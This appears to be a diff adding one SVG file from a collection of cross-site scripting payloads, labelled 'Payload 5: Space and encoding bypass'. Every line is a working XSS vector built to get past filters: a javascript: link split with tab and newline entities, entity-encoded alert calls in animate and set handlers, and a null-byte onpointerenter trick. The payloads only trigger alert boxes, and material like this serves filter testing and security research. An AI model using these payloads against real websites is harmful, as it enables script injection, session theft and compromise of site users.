@@ -1,0 +1,7 @@
+<!-- Payload 5: Space and encoding bypass -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;alert&Tab;(document.domain)&rpar;">
+    <animate attributeName="x" values="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+    <set onbegin="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" attributeName=x>
+    <svg onx+%00+onpointerenter%3dalert(domain)+x>
+</svg>
